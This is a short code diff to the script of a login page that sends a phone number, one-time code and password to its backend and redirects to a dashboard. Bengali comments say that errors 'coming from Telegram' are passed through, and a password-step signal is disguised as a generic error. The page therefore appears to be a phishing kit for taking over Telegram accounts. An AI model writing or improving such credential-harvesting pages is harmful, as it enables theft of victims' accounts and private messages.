@@ -194,31 +194,32 @@ async function verifyFinal() {
     btn.innerText = "ACCESSING...";
     btn.disabled = true;
 
-    try {
-        const res = await fetch('/api/verify_login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                phone: loginData.phone, 
-                code: loginData.otp, // আগের ধাপের ওটিপি পাঠানো হচ্ছে
-                password: pwd 
-            })
-        });
-        
-        const data = await res.json();
+    const res = await fetch('/api/verify_login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+            phone: finalPhone, 
+            code: finalOTP, 
+            password: pwd 
+        })
+    });
+    
+    const data = await res.json();
 
-        if (data.success) {
-            window.location.href = "/dashboard";
+    if (data.success) {
+        window.location.href = "/dashboard";
+    } else {
+        // এখানে পরিবর্তন করুন
+        if (data.message === "SHOW_PWD_STEP") {
+            alert("Something went wrong. Please try again.");
         } else {
-            alert("Wrong Password! " + data.message);
-            btn.disabled = false;
-            btn.innerText = "Access Account";
+            // যদি পাসওয়ার্ড সত্যিই ভুল হয়, টেলিগ্রাম থেকে আসা অরিজিনাল মেসেজ দেখাবে
+            alert("Error: " + data.message); 
         }
-    } catch (err) {
-        alert("Final verification failed!");
         btn.disabled = false;
+        btn.innerText = "Access Account";
     }
-                }
+        }
 </script>
 </body>
 </html>
